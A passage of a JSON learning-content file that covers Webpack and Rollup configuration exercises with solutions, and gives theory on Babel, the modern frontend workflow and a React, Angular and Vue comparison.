          "startingCode": "const path = require('path');\n// const HtmlWebpackPlugin = require('html-webpack-plugin'); // Don't forget to import\n\nmodule.exports = {\n  // 1. Define entry\n  // entry: '',\n\n  // 2. Define output\n  // output: {\n  //   path: path.resolve(__dirname, 'dist'),\n  //   filename: ''\n  // },\n\n  // 3. Define module rules (loaders)\n  // module: {\n  //   rules: [\n  //     // Rule for JS/JSX\n  //     // Rule for CSS\n  //   ]\n  // },\n\n  // 4. Define plugins\n  // plugins: [\n  //   // Add HtmlWebpackPlugin here\n  // ],\n\n  // 5. Set mode\n  // mode: ''\n};\n",
          "solutionCode": "const path = require('path');\nconst HtmlWebpackPlugin = require('html-webpack-plugin');\n\nmodule.exports = {\n  entry: './src/index.js',\n  output: {\n    path: path.resolve(__dirname, 'dist'),\n    filename: 'bundle.js'\n  },\n  module: {\n    rules: [\n      {\n        test: /\\.(js|jsx)$/,\n        exclude: /node_modules/,\n        use: {\n          loader: 'babel-loader',\n          options: {\n            presets: ['@babel/preset-env', '@babel/preset-react']\n          }\n        }\n      },\n      {\n        test: /\\.css$/,\n        use: ['style-loader', 'css-loader']\n      }\n    ]\n  },\n  plugins: [\n    new HtmlWebpackPlugin({\n      template: './src/index.html'\n    })\n  ],\n  mode: 'development',\n  devServer: {\n    static: { // Changed from 'contentBase' in older versions\n      directory: path.join(__dirname, 'dist'),\n    },\n    compress: true,\n    port: 9000,\n    open: true, // Open browser automatically\n  },\n};\n\n/* Example package.json scripts:\n{\n  \"name\": \"webpack-react-app\",\n  \"version\": \"1.0.0\",\n  \"description\": \"\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"start\": \"webpack serve --open\",\n    \"build\": \"webpack --mode production\"\n  },\n  \"keywords\": [],\n  \"author\": \"\",\n  \"license\": \"ISC\",\n  \"devDependencies\": {\n    \"@babel/core\": \"^7.23.3\",\n    \"@babel/preset-env\": \"^7.23.3\",\n    \"@babel/preset-react\": \"^7.23.3\",\n    \"babel-loader\": \"^9.1.3\",\n    \"css-loader\": \"^6.8.1\",\n    \"html-webpack-plugin\": \"^5.5.3\",\n    \"style-loader\": \"^3.3.3\",\n    \"webpack\": \"^5.89.0\",\n    \"webpack-cli\": \"^5.1.4\",\n    \"webpack-dev-server\": \"^4.15.1\"\n  },\n  \"dependencies\": {\n    \"react\": \"^18.2.0\",\n    \"react-dom\": \"^18.2.0\"\n  }\n}\n*/",
          "testCases": [
            "Create project structure: `src/index.js`, `src/index.html`, `src/App.js`, `src/styles.css`.",
            "Populate `src/index.js` with basic React render, `src/App.js` with a simple component.",
            "Add some CSS to `src/styles.css` and import it in `index.js`.",
            "Run `npm install` for all devDependencies and dependencies.",
            "Run `npm run build` and check `dist/bundle.js` and `dist/index.html`.",
            "Run `npm start` and verify the app serves correctly with hot reloading."
          ],
          "hints": [
            "Remember that Webpack `module.rules.use` array applies loaders from right to left.",
            "The `test` property in module rules uses a regular expression to match file extensions.",
            "For `HtmlWebpackPlugin`, ensure your `src/index.html` is a valid HTML template.",
            "Check `webpack-dev-server` configuration for the `static` option instead of `contentBase` for newer Webpack versions."
          ],
          "tags": [
            "Webpack",
            "React",
            "Bundling",
            "Configuration",
            "Frontend Frameworks"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "JavaScript Modules",
            "React Basics",
            "Node.js",
            "npm"
          ],
          "complexity": 8,
          "interviewRelevance": 10,
          "learningPath": "advanced",
          "relatedConcepts": [
            "Webpack Loaders",
            "Webpack Plugins",
            "Babel Transpilation",
            "React Ecosystem"
          ]
        },
        {
          "id": "task_webpack_image_handling",
          "title": "Configure Webpack to Handle Image Assets",
          "description": "\nExtend the previous Webpack configuration (or start a new minimal one) to properly handle image assets (`.png`, `.jpg`, `.jpeg`, `.gif`, `.svg`). Your goal is to:\n\n1.  Configure Webpack to import image files.\n2.  Use Webpack's built-in asset modules (Asset Modules) to serve images, either as inline base64 data (for small images) or as separate files (for large images).\n3.  Ensure that images imported in JavaScript or CSS are correctly processed and included in the output bundle or `dist` folder.\n\nYour `webpack.config.js` should demonstrate the use of `asset/resource` and `asset/inline` or `asset` module types based on file size thresholds.\n",
          "difficulty": "medium",
          "startingCode": "const path = require('path');\n\nmodule.exports = {\n  entry: './src/index.js',\n  output: {\n    path: path.resolve(__dirname, 'dist'),\n    filename: 'bundle.js',\n    assetModuleFilename: 'images/[name][ext][query]' // Optional: output path for assets\n  },\n  module: {\n    rules: [\n      // Existing rules for JS/CSS...\n      // Add rule for images here\n      // {\n      //   test: /\\.(png|svg|jpg|jpeg|gif)$/i,\n      //   type: 'asset',\n      //   parser: { dataUrlCondition: { maxSize: 8 * 1024 } } // 8kb limit\n      // },\n    ]\n  }\n  // ... other configs\n};\n\n/* Example usage in src/index.js:\nimport imageUrl from './assets/my-image.png';\nconst img = document.createElement('img');\nimg.src = imageUrl;\ndocument.body.appendChild(img);\n*/\n",
          "solutionCode": "const path = require('path');\nconst HtmlWebpackPlugin = require('html-webpack-plugin');\n\nmodule.exports = {\n  entry: './src/index.js',\n  output: {\n    path: path.resolve(__dirname, 'dist'),\n    filename: 'bundle.js',\n    clean: true, // Cleans the output directory before each build\n    assetModuleFilename: 'images/[name][ext][query]' // Specifies output path for assets\n  },\n  module: {\n    rules: [\n      {\n        test: /\\.(js|jsx)$/,\n        exclude: /node_modules/,\n        use: {\n          loader: 'babel-loader',\n          options: {\n            presets: ['@babel/preset-env', '@babel/preset-react']\n          }\n        }\n      },\n      {\n        test: /\\.css$/,\n        use: ['style-loader', 'css-loader']\n      },\n      {\n        test: /\\.(png|svg|jpg|jpeg|gif)$/i, // Regex to match common image formats\n        type: 'asset', // Use Webpack 5's Asset Modules\n        parser: {\n          dataUrlCondition: {\n            maxSize: 8 * 1024 // 8kb - assets smaller than this will be inlined as data URIs\n          }\n        },\n        generator: { // Optional: Customize output filename of resource assets\n          filename: 'assets/images/[name].[hash:8][ext]',\n        },\n      },\n      {\n        test: /\\.(woff|woff2|eot|ttf|otf)$/i, // Rule for fonts\n        type: 'asset/resource',\n      },\n    ]\n  },\n  plugins: [\n    new HtmlWebpackPlugin({\n      template: './src/index.html'\n    })\n  ],\n  mode: 'development',\n  devServer: {\n    static: {\n      directory: path.join(__dirname, 'dist'),\n    },\n    compress: true,\n    port: 9000,\n    open: true,\n  },\n};\n\n/* Example package.json scripts (same as previous task, just add a few more devDependencies):\n  \"devDependencies\": {\n    // ... (previous devDependencies)\n    \"file-loader\": \"^6.2.0\", // Not strictly needed with asset modules, but useful for context\n    \"url-loader\": \"^4.1.1\"   // Not strictly needed with asset modules, but useful for context\n  }\n*/",
          "testCases": [
            "Create `src/assets/small-image.png` (e.g., < 8KB) and `src/assets/large-image.jpg` (e.g., > 8KB).",
            "In `src/index.js`, import both images and add them to the DOM (e.g., `<img>` tags).",
            "Add a CSS rule that uses `background-image: url(...)` with one of the images.",
            "Run `npm run build`.",
            "Verify that `small-image.png` is inlined as a data URI in `bundle.js` or `index.html`.",
            "Verify that `large-image.jpg` is output as a separate file in `dist/images/` (or `dist/assets/images/`) and its path is correctly referenced in the bundle.",
            "Verify images loaded via CSS are also handled correctly."
          ],
          "hints": [
            "Webpack 5 introduced 'Asset Modules' (`type: 'asset'`, `type: 'asset/resource'`, `type: 'asset/inline'`) which replace `file-loader` and `url-loader`.",
            "Use `type: 'asset'` combined with `parser.dataUrlCondition.maxSize` to automatically switch between inlining and emitting separate files.",
            "The `output.assetModuleFilename` property can customize the output filename and path for emitted assets."
          ],
          "tags": [
            "Webpack",
            "Assets",
            "Images",
            "Configuration",
            "Loaders",
            "Optimization"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "Webpack Configuration",
            "Frontend Assets"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "relatedConcepts": [
            "Asset Management",
            "Performance Optimization",
            "Webpack 5 Features"
          ]
        },
        {
          "id": "task_rollup_library_build",
          "title": "Build a Simple JavaScript Utility Library with Rollup",
          "description": "\nYour task is to use Rollup to build a small JavaScript utility library that exports multiple functions. The library should:\n\n1.  Have `src/main.js` as its entry point.\n2.  Export at least three functions from `src/utils.js` (e.g., `add`, `subtract`, `isEven`).\n3.  Consume these functions in `src/main.js` (but not necessarily all of them to demonstrate tree-shaking).\n4.  Output a bundled file named `dist/my-library.js`.\n5.  Use the `iife` (Immediately Invoked Function Expression) format for browser compatibility.\n6.  Transpile ES6+ code using `@rollup/plugin-babel` with `@babel/preset-env`.\n7.  Include `@rollup/plugin-node-resolve` to handle any potential `node_modules` imports (even if minimal for this task).\n\nYour solution should provide the `rollup.config.js` and example source files.\n",
          "difficulty": "medium",
          "startingCode": "import resolve from '@rollup/plugin-node-resolve';\nimport babel from '@rollup/plugin-babel';\n\nexport default {\n  // 1. Define input\n  // input: '',\n\n  // 2. Define output\n  // output: {\n  //   file: '',\n  //   format: ''\n  // },\n\n  // 3. Define plugins\n  // plugins: [\n  //   // Add resolve() and babel() here\n  // ]\n};\n\n// Example src/utils.js\n// export function add(a, b) { /* ... */ }\n// export function subtract(a, b) { /* ... */ }\n\n// Example src/main.js\n// import { add } from './utils';\n// console.log(add(1, 2));\n",
          "solutionCode": "import resolve from '@rollup/plugin-node-resolve';\nimport babel from '@rollup/plugin-babel';\n\nexport default {\n  input: 'src/main.js',\n  output: {\n    file: 'dist/my-library.js',\n    format: 'iife', // For browser compatibility\n    name: 'MyLibrary', // Global variable name if format is iife/umd\n    sourcemap: true, // Generate sourcemap for debugging\n  },\n  plugins: [\n    resolve(), // Allows Rollup to find modules in node_modules\n    babel({\n      babelHelpers: 'bundled', // Ensures babel helpers are included in the bundle\n      presets: ['@babel/preset-env'], // Transpiles to target environment\n      exclude: 'node_modules/**', // Exclude node_modules from transpilation\n    }),\n  ],\n};\n\n/* Example Project Structure and Files:\n\n// package.json (devDependencies):\n//   \"@babel/core\": \"^7.23.3\",\n//   \"@babel/preset-env\": \"^7.23.3\",\n//   \"@rollup/plugin-babel\": \"^6.0.4\",\n//   \"@rollup/plugin-node-resolve\": \"^15.2.3\",\n//   \"rollup\": \"^4.6.0\"\n// Scripts:\n//   \"build\": \"rollup -c\"\n\n// src/utils.js\nexport function add(a, b) {\n  return a + b;\n}\n\nexport function subtract(a, b) {\n  // This function might be tree-shaken if not imported\n  console.log('Subtracting ' + a + ' and ' + b);\n  return a - b;\n}\n\nexport function multiply(a, b) {\n  return a * b;\n}\n\n// src/main.js\nimport { add, multiply } from './utils.js';\n\nconst sum = add(10, 5);\nconst product = multiply(10, 5);\n\nconsole.log('Sum:', sum);\nconsole.log('Product:', product);\n\n// A function that is never called, demonstrating potential for tree-shaking\nexport function unusedFunction() {\n  console.log('This function is not used.');\n}\n\n*/",
          "testCases": [
            "Create `src/utils.js` and `src/main.js` as described, ensuring `main.js` only imports a subset of functions from `utils.js`.",
            "Run `npm install` for required Rollup and Babel plugins.",
            "Run `rollup -c` from the terminal (assuming `rollup` is in `package.json` scripts).",
            "Verify `dist/my-library.js` is created and is in `iife` format.",
            "Examine `dist/my-library.js` to confirm that `subtract` (if not imported by `main.js`) and `unusedFunction` (if not called) are *not* present in the final bundle, demonstrating tree-shaking."
          ],
          "hints": [
            "The `output.name` property is crucial for `iife` and `umd` formats, defining the global variable name.",
            "Ensure `babelHelpers: 'bundled'` is set for `@rollup/plugin-babel` if you want Babel's helper functions included in your bundle.",
            "To run Rollup from the command line, typically you'd add `\"build\": \"rollup -c\"` to your `package.json` scripts."
          ],
          "tags": [
            "Rollup",
            "Library Development",
            "Bundling",
            "ES Modules",
            "Tree-shaking",
            "Babel"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "JavaScript Modules",
            "ES6+",
            "Node.js",
            "npm"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "advanced",
          "relatedConcepts": [
            "Rollup Configuration",
            "Tree-shaking",
            "ES Modules",
            "JavaScript Library Design"
          ]
        }
      ]
    }
  },
  {
    "id": "99d9606f-4142-4fc9-9a87-6944c74a8151",
    "startLine": 12900,
    "endLine": 12999,
    "processedDate": "2025-06-17T13:09:33.580Z",
    "content": {
      "logicalBlockInfo": {
        "suggestedEndLine": -1
      },
      "theory": [
        {
          "id": "theory_transpilers_babel",
          "title": "Transpilers and Babel",
          "content": "## What is a Transpiler?\nIn modern web development, a transpiler (or source-to-source compiler) is a program that converts source code written in one programming language into source code in another programming language. This is distinct from a traditional compiler that converts source code into machine code or bytecode.\n\n## Babel\nBabel is a popular JavaScript transpiler that plays a crucial role in the modern frontend development workflow. Its primary function is to transform next-generation JavaScript (ECMAScript 2015+ or ES6+) into a backwards-compatible version of JavaScript that can run in current and older browsers or environments that do not fully support newer language features.\n\n### Why is Babel necessary?\nWeb browsers and Node.js environments often have varying levels of support for the latest ECMAScript features. By using Babel, developers can write code using cutting-edge JavaScript syntax (like arrow functions, `const`/`let`, classes, async/await, JSX, and TypeScript) and still ensure their applications are compatible with a wider range of target environments, improving accessibility and avoiding fragmented user experiences.\n\n### Key Concepts in Babel Configuration\n*   **Presets**: A preset is a shareable set of Babel plugins and/or options. They allow you to easily configure Babel for specific environments or language features without individually listing every single plugin. For instance, `@babel/preset-env` is a powerful preset that intelligently determines which Babel plugins are needed based on your target environments (e.g., specific browser versions or Node.js versions).\n*   **Plugins**: Plugins are specific transformations that Babel performs on your code. Each plugin typically handles one particular language feature. For example, `@babel/plugin-proposal-class-properties` allows you to use class field declarations (public and private class fields) which are a stage 3 ECMAScript proposal.\n\n### Configuration Example (`babel.config.js`)\nBabel's configuration is typically managed in a file like `babel.config.js` (for project-wide configuration) or `.babelrc` (for directory-specific configuration). The `module.exports` object defines the presets and plugins to be used.\n\n**Common options within `@babel/preset-env`:**\n*   `targets`: Specifies the environments you want to support. This can be a browserslist query string (e.g., `'> 1%', 'last 2 versions'`) or an object specifying specific browser versions or Node.js versions. Babel uses this to only apply transformations for features not supported by your target environments, optimizing bundle size and build time.\n*   `useBuiltIns`: When set to `'usage'` or `'entry'`, this option integrates with `core-js` to automatically polyfill ECMAScript features that are missing in your target environments, further enhancing compatibility.\n",
          "examples": [
            {
              "id": "example_babel_config",
              "title": "Babel Configuration for Modern JS",
              "code": "module.exports = {\n  presets: [\n    ['@babel/preset-env', {\n      targets: {\n        browsers: ['> 1%', 'last 2 versions', 'not dead']\n      },\n      useBuiltIns: 'usage',\n      corejs: 3 // Specify the core-js version for polyfills\n    }]\n  ],\n  plugins: [\n    '@babel/plugin-proposal-class-properties',\n    '@babel/plugin-transform-runtime' // Helps to avoid duplication of helper code\n  ]\n};",
              "explanation": "This configuration demonstrates a typical setup for Babel. It uses `@babel/preset-env` to transpile modern JavaScript features down to a version compatible with 99% of current browsers and the last two stable versions, excluding completely dead browsers. It also uses `useBuiltIns: 'usage'` and `corejs: 3` to automatically include polyfills only for the features actually used in the code and not supported by the target environments. The `@babel/plugin-proposal-class-properties` enables support for class field syntax, and `@babel/plugin-transform-runtime` helps reduce bundle size by preventing helper functions from being duplicated across multiple files.",
              "language": "javascript"
            },
            {
              "id": "example_es6_to_es5",
              "title": "ES6+ to ES5 Transpilation Example",
              "code": "// Input (ES6+)\nclass Greeter {\n  message = 'Hello';\n  constructor(name) {\n    this.name = name;\n  }\n  greet() {\n    return `${this.message}, ${this.name}!`\n  }\n}\nconst person = new Greeter('World');\nconsole.log(person.greet());\n\n// Output (transpiled ES5 by Babel, simplified)\n\"use strict\";\n\nfunction _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError(\"Cannot call a class as a function\"); } }\n\nfunction _defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if (\"value\" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } }\n\nfunction _createClass(Constructor, protoProps, staticProps) { if (protoProps) _defineProperties(Constructor.prototype, protoProps); if (staticProps) _defineProperties(Constructor, staticProps); Object.defineProperty(Constructor, \"prototype\", { writable: false }); return Constructor; }\n\nvar Greeter = /*#__PURE__*/function () {\n  function Greeter(name) {\n    _classCallCheck(this, Greeter);\n\n    this.message = 'Hello';\n    this.name = name;\n  }\n\n  _createClass(Greeter, [{\n    key: \"greet\",\n    value: function greet() {\n      return \"\".concat(this.message, \", \").concat(this.name, \"!\");\n    }\n  }]);\n\n  return Greeter;\n}();\n\nvar person = new Greeter('World');\nconsole.log(person.greet());",
              "explanation": "This example illustrates how Babel transforms modern ES6+ JavaScript code (like classes, string literals with template syntax, and class properties) into older ES5 syntax. The original, cleaner ES6 code is on the left, and a simplified version of the Babel-transpiled ES5 output is on the right. Notice the use of helper functions (`_classCallCheck`, `_defineProperties`, `_createClass`) to mimic class behavior in ES5, and string concatenation replacing template literals.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [
            "question_transpilers_babel_1",
            "question_transpilers_babel_2",
            "question_transpilers_babel_3",
            "question_transpilers_babel_4",
            "question_transpilers_babel_5"
          ],
          "relatedTasks": [
            "task_babel_config"
          ],
          "tags": [
            "JavaScript",
            "Transpilers",
            "Babel",
            "ES6+",
            "Build Tools"
          ],
          "technology": "JavaScript",
          "prerequisites": [
            "javascript_basics",
            "frontend_development_overview"
          ],
          "complexity": 6,
          "interviewRelevance": 7,
          "learningPath": "intermediate",
          "requiredFor": [
            "modern_frontend_development",
            "webpack_configuration",
            "react_development"
          ]
        },
        {
          "id": "theory_modern_dev_workflow",
          "title": "Modern Frontend Development Workflow",
          "content": "## Overview of a Modern JavaScript Development Workflow\nA modern JavaScript development workflow is a systematic process that incorporates various tools and practices to streamline the development, testing, and deployment of web applications. This structured approach helps manage complexity, improve code quality, and increase developer productivity. Here are the common stages:\n\n1.  **Project Initialization**: This is the first step where a new project structure is set up. It typically involves creating a `package.json` file to manage project metadata and dependencies. Tools like npm or Yarn are commonly used for this purpose, often generating basic project templates.\n\n2.  **Dependency Management**: As projects grow, they rely on numerous external libraries and packages (dependencies). npm (Node Package Manager) and Yarn are essential package managers that allow developers to install, update, remove, and manage these dependencies efficiently. They resolve dependency trees, ensuring all required packages are available and compatible.\n\n3.  **Build Process**: Modern web applications often consist of many JavaScript modules, CSS files, images, and other assets. A build process consolidates these assets into optimized, deployable bundles. Tools like Webpack or Rollup are module bundlers that perform tasks such as:\n    *   **Module Bundling**: Combining multiple JavaScript modules into a single (or a few) files to reduce HTTP requests.\n    *   **Transpilation**: Converting modern JavaScript (ES6+) into backward-compatible JavaScript (ES5) using tools like Babel.\n    *   **Minification**: Removing unnecessary characters (whitespace, comments) from code to reduce file size.\n    *   **Code Splitting**: Breaking code into smaller chunks that can be loaded on demand, improving initial load times.\n    *   **Asset Optimization**: Processing and optimizing images, fonts, and other assets.\n\n4.  **Task Automation**: Repetitive tasks, such as compiling Sass to CSS, linting code, running tests, or generating documentation, can be automated to save time and reduce errors. Tools like Gulp or Grunt are task runners that allow developers to define and run custom build tasks.\n\n5.  **Development Server**: During development, a local web server is crucial for previewing the application. Development servers often come with features like:\n    *   **Hot Module Replacement (HMR)**: Automatically updates the browser with changes to code without a full page reload, preserving application state.\n    *   **Live Reload**: Automatically reloads the browser when file changes are detected.\n    *   **Proxying API requests**: Redirecting API calls from the frontend to a backend server.\n\n6.  **Testing**: Ensuring code quality and preventing regressions is vital. Automated testing frameworks help verify the functionality and correctness of the application. Common testing tools include:\n    *   **Unit Testing**: Jest, Mocha (for individual functions or components).\n    *   **Integration Testing**: React Testing Library, Enzyme (for interactions between components).\n    *   **End-to-End Testing**: Cypress, Playwright (for simulating user interactions across the entire application).\n\n7.  **Linting**: Linting is the process of analyzing source code to flag programming errors, bugs, stylistic errors, and suspicious constructs. Linters enforce coding standards and best practices, leading to more consistent and maintainable code. ESLint is the most popular linter for JavaScript/TypeScript, often used in conjunction with Prettier for code formatting.\n\n8.  **CI/CD (Continuous Integration/Continuous Deployment)**: CI/CD pipelines automate the processes of building, testing, and deploying applications. This ensures that new code changes are integrated, tested, and deployed frequently and reliably. Popular CI/CD platforms include Jenkins, GitLab CI/CD, GitHub Actions, and CircleCI.\n    *   **Continuous Integration (CI)**: Developers frequently merge their code changes into a central repository. Automated builds and tests are run to detect integration issues early.\n    *   **Continuous Deployment (CD)**: After successful integration and testing, changes are automatically deployed to production environments.",
          "examples": [
            {
              "id": "example_package_json",
              "title": "Basic package.json for Project Initialization",
              "code": "{\n  \"name\": \"my-frontend-app\",\n  \"version\": \"1.0.0\",\n  \"description\": \"A simple frontend application.\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"start\": \"webpack serve --open\",\n    \"build\": \"webpack\",\n    \"test\": \"jest\",\n    \"lint\": \"eslint .\"\n  },\n  \"keywords\": [],\n  \"author\": \"Your Name\",\n  \"license\": \"ISC\",\n  \"devDependencies\": {\n    \"webpack\": \"^5.0.0\",\n    \"webpack-cli\": \"^4.0.0\",\n    \"webpack-dev-server\": \"^4.0.0\",\n    \"babel-loader\": \"^8.0.0\",\n    \"@babel/core\": \"^7.0.0\",\n    \"@babel/preset-env\": \"^7.0.0\",\n    \"eslint\": \"^8.0.0\",\n    \"jest\": \"^29.0.0\"\n  }\n}",
              "explanation": "This `package.json` file is central to a modern workflow. It defines the project's metadata, scripts for common tasks (start, build, test, lint), and lists development dependencies. `npm install` or `yarn install` would use this file to set up the project environment. The scripts defined here (`start`, `build`, etc.) are direct entry points for executing various tools like Webpack and ESLint.",
              "language": "json"
            },
            {
              "id": "example_webpack_config",
              "title": "Minimal Webpack Configuration",
              "code": "const path = require('path');\n\nmodule.exports = {\n  mode: 'development',\n  entry: './src/index.js',\n  output: {\n    filename: 'bundle.js',\n    path: path.resolve(__dirname, 'dist'),\n  },\n  module: {\n    rules: [\n      {\n        test: /\\.js$/,\n        exclude: /node_modules/,\n        use: {\n          loader: 'babel-loader',\n          options: {\n            presets: ['@babel/preset-env'],\n          },\n        },\n      },\n      {\n        test: /\\.css$/i,\n        use: ['style-loader', 'css-loader'],\n      },\n    ],\n  },\n  devServer: {\n    static: path.join(__dirname, 'dist'),\n    compress: true,\n    port: 9000,\n    hot: true, // Enable Hot Module Replacement\n  },\n};",
              "explanation": "This is a basic `webpack.config.js` file. It configures Webpack to take `src/index.js` as its entry point, bundle it into `bundle.js` in the `dist` folder. It includes a rule to transpile `.js` files using `babel-loader` (with `@babel/preset-env`), and rules to handle CSS files. The `devServer` configuration sets up a local development server with hot reloading, serving files from the `dist` directory on port 9000.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [
            "question_modern_dev_workflow_1",
            "question_modern_dev_workflow_2",
            "question_modern_dev_workflow_3",
            "question_modern_dev_workflow_4",
            "question_modern_dev_workflow_5"
          ],
          "relatedTasks": [
            "task_setup_dev_workflow"
          ],
          "tags": [
            "Frontend Development",
            "Workflow",
            "Build Tools",
            "Package Management",
            "Testing",
            "CI/CD"
          ],
          "technology": "JavaScript",
          "prerequisites": [
            "javascript_basics",
            "npm_yarn_basics"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "professional_frontend_development",
            "project_setup",
            "performance_optimization"
          ]
        },
        {
          "id": "theory_js_framework_comparison",
          "title": "JavaScript Framework Comparison: React, Angular, Vue",
          "content": "## Choosing a JavaScript Framework\nIn the landscape of modern frontend development, React, Angular, and Vue are the three dominant choices for building single-page applications (SPAs) and complex user interfaces. Each has its philosophy, strengths, and ideal use cases. Understanding their core differences is crucial for making informed technology decisions.\n\n### Feature Comparison:\n\n*   **Type**:\n    *   **React**: Primarily a JavaScript **library** for building user interfaces. It focuses solely on the view layer, allowing developers to pick other libraries for routing, state management, etc., offering high flexibility.\n    *   **Angular**: A comprehensive **full framework** that provides a structured opinionated approach to building applications. It comes with a complete set of features out-of-the-box, including a router, HTTP client, and state management solutions.\n    *   **Vue**: A **progressive framework** that is designed to be incrementally adoptable. It can be used as a simple library for declarative rendering or scaled up to a full-fledged framework with its ecosystem tools (Vue Router, Vuex).\n\n*   **Learning Curve**:\n    *   **React**: Generally considered **moderate**. While JSX and component-based thinking might be new, its core API is small and functional. The learning curve often comes from its rich ecosystem and the freedom to choose additional libraries.\n    *   **Angular**: Often described as **steep**. Its comprehensive nature, reliance on TypeScript, concepts like modules, decorators, services, and dependency injection require a significant upfront investment to learn.\n    *   **Vue**: Known for its **gentle** learning curve. Its API is intuitive, well-documented, and it offers familiar templating syntax (HTML-based), making it easy for beginners, especially those with HTML/CSS backgrounds.\n\n*   **Data Binding**:\n    *   **React**: Employs **one-way data binding (unidirectional data flow)**. State flows down from parent components to children. Changes in child components often trigger actions that update the parent's state, which then re-renders children. This makes state management predictable and debugging easier.\n    *   **Angular**: Supports **two-way data binding**. Changes in the model (data) automatically update the view (UI), and changes in the view automatically update the model. This is often implemented using `ngModel` directive, simplifying form handling but potentially making data flow less explicit in complex applications.\n    *   **Vue**: Offers **two-way data binding (optional)**. While Vue's core rendering is reactive (one-way), it provides `v-model` for convenient two-way data binding on form inputs, similar to Angular, but it's an opt-in feature.\n\n*   **DOM (Document Object Model)**:\n    *   **React**: Utilizes a **Virtual DOM**. This is a lightweight, in-memory representation of the actual DOM. When state changes, React first updates the Virtual DOM, then efficiently calculates the minimal set of changes needed to update the real DOM, minimizing expensive direct manipulations.\n    *   **Angular**: Directly interacts with the **Real DOM** but uses its own **change detection mechanism**. When data changes, Angular's change detection algorithm (often triggered by zones) identifies which parts of the DOM need updating and performs direct manipulations. This can be efficient but might require optimization for very complex applications.\n    *   **Vue**: Also uses a **Virtual DOM**, similar to React, for efficient rendering updates. It tracks dependencies of components during render, which allows for very precise re-rendering of only the components that are affected by state changes.\n\n*   **Size**:\n    *   **React**: Relatively **lightweight (~40KB)** for the core library, but the total bundle size increases as more third-party libraries (router, state management, etc.) are added.\n    *   **Angular**: Generally **larger (~500KB)** due to being a full framework with many built-in features.\n    *   **Vue**: Very **lightweight (~33KB)** for its core, comparable to React, and scalable based on features used.\n\n*   **Mobile Development**:\n    *   **React**: Strong presence with **React Native** for building native mobile apps using JavaScript/React concepts.\n    *   **Angular**: Can be used with **Ionic** (for hybrid apps using web technologies) or **NativeScript** (for native apps).\n    *   **Vue**: Has **Vue Native** (similar to React Native) and also works with **NativeScript**.\n\n*   **Flexibility**:\n    *   **React**: **High flexibility** as it's a library, allowing developers to choose their preferred tools and libraries for different concerns (routing, state, etc.). This freedom can also lead to decision fatigue or inconsistent approaches within large teams.\n    *   **Angular**: **Medium flexibility**. As a full framework, it offers less choice but more convention, leading to consistency across projects, which can be beneficial for large enterprise applications.\n    *   **Vue**: **High flexibility** due to its progressive nature. It can be used for small, simple integrations or large-scale SPAs, providing choices while also offering opinionated official tools.\n\n*   **Development Approach**:\n    *   **React**: Primarily **component-based**, where UI is broken down into reusable, self-contained components. Focuses on functional programming paradigms with hooks for state and lifecycle management.\n    *   **Angular**: **Module-based** with a strong emphasis on object-oriented programming (OOP) principles. Applications are structured into NgModules, services, directives, and components, heavily relying on TypeScript and decorators.\n    *   **Vue**: Also strongly **component-based**, similar to React. Components are the building blocks, and Vue offers a more approachable syntax for defining them using Single File Components (`.vue` files).\n\n*   **Community & Ecosystem**:\n    *   **React**: Has a **large** and vibrant community, extensive third-party libraries, and readily available learning resources due to its popularity.\n    *   **Angular**: Also boasts a **large** enterprise-focused community, with strong corporate backing and a mature ecosystem.\n    *   **Vue**: Has a rapidly **growing** and highly engaged community, especially popular in Asia, with excellent documentation.\n\n*   **Corporate Support**:\n    *   **React**: Backed and maintained by **Facebook (Meta)**.\n    *   **Angular**: Backed and maintained by **Google**.\n    *   **Vue**: Maintained by an **independent** core team led by Evan You, relying on community contributions and sponsorships.\n",
          "examples": [],
          "relatedQuestions": [
            "question_framework_comparison_1",
            "question_framework_comparison_2",
            "question_framework_comparison_3",
            "question_framework_comparison_4",
            "question_framework_comparison_5",
            "question_framework_comparison_6"
          ],
          "relatedTasks": [],
          "tags": [
            "React",
            "Angular",
            "Vue",
            "Frontend Frameworks",
            "Library",
            "Web Development",
            "Comparison"
          ],
          "technology": "JavaScript",
          "prerequisites": [
            "javascript_basics",
            "dom_manipulation"
          ],
          "complexity": 8,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "framework_selection",
            "frontend_architecture",
            "career_path_frontend"
          ]
        },
        {
          "id": "theory_why_choose_react",
          "title": "Key Advantages of Choosing React",
          "content": "React, often described as a JavaScript library for building user interfaces, has gained immense popularity due to its powerful features and pragmatic approach to frontend development. Here's a deeper dive into why developers and companies choose React:\n\n1.  **Reusable Components**: React promotes a component-based architecture, where the UI is broken down into small, independent, and self-contained pieces called components. Each component manages its own state and logic. This modularity allows developers to reuse components across different parts of an application or even in entirely different projects, leading to faster development, easier maintenance, and consistent UI.\n\n2.  **Virtual DOM**: One of React's most significant performance optimizations is its use of a **Virtual DOM**. Instead of making direct manipulations to the browser's expensive Real DOM every time the application state changes, React first updates an in-memory representation of the DOM (the Virtual DOM). It then efficiently compares this updated Virtual DOM with the previous one, identifies the minimal differences, and only applies those necessary changes to the Real DOM. This diffing algorithm minimizes costly DOM operations, resulting in faster and smoother user interfaces, especially for complex and dynamic applications.\n\n3.  **One-way Data Flow (Unidirectional)**: React enforces a unidirectional data flow, meaning data flows in a single direction—typically from parent components down to child components via props. When state changes, the application re-renders to reflect those changes. This predictable data flow makes it much easier to understand how data is being updated throughout the application, simplifies debugging, and reduces the likelihood of complex, hard-to-trace bugs often associated with two-way data binding.\n\n4.  **SEO Friendly (Server-Side Rendering)**: Traditional Single Page Applications (SPAs) often face challenges with Search Engine Optimization (SEO) because their content is rendered dynamically by JavaScript on the client-side, making it difficult for search engine crawlers to index. React can be rendered on the server-side (SSR) using frameworks like Next.js or Gatsby. This pre-renders the initial 